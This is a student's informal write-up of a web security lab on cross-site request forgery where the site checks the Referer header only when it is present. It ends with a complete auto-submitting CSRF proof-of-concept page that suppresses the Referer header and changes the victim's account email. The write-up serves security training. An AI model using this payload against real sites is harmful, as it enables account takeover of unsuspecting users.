# CSRF where Referer validation depends on header being present
- lab's email change functionality is vulnerable to CSRF
- attempts to block cross domain requests but has an insecure fallback
- credentials: wiener:peter
# Goal
- attempts to block cross domain requests but has an insecure fallback
# Solving The Lab
- log in and change email
- for CSRF To be possibel
  - Certain Action : change email
  - cookie based session handeling : session cookie
  - no unpredictablle request parameters :
- now try our same expoit from burp csrf poc but we got n error that says invalid refer header
- now we test for referer header
  - remove referer headeer and check the response : YES
- now the poc is like this
```
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <head>

    <meta name="referrer" content="no-referrer">

  </head> 

  <body>

    <form action="https://0a37003b04996c0682f3792900cb000c.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="tedsst&#64;mail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>
```
- lab is solved
